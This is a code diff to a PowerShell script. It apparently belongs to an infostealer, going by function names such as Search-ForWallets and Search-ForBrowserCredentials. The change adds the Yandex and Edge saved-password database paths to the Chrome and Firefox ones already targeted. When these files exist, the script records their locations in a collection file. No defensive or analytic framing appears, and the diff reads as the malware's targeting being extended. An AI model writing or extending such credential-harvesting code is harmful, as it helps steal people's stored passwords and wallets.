@@ -34,6 +34,8 @@ function Search-ForWallets {
 function Search-ForBrowserCredentials {
     $chromePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
     $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json"
+    $yandexPath = "$env:USERPROFILE\AppData\Local\Yandex\YandexBrowser\User Data\Default\Ya Passman Data"
+    $edgePath = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
 
     Add-Content -Path $infoFilePath -Value "`n### Browser Credential Files ###"
     if (Test-Path $chromePath) {
@@ -41,6 +43,12 @@ function Search-ForBrowserCredentials {
     }
     if (Test-Path $firefoxPath) {
         Add-Content -Path $infoFilePath -Value "Found Firefox credentials: $firefoxPath"
+    }
+    if (Test-Path $yandexPath) {
+        Add-Content -Path $infoFilePath -Value "Found Yandex credentials: $yandexPath"
+    }
+    if (Test-Path $edgePath) {
+        Add-Content -Path $infoFilePath -Value "Found Edge credentials: $edgePath"
     }
 }
 
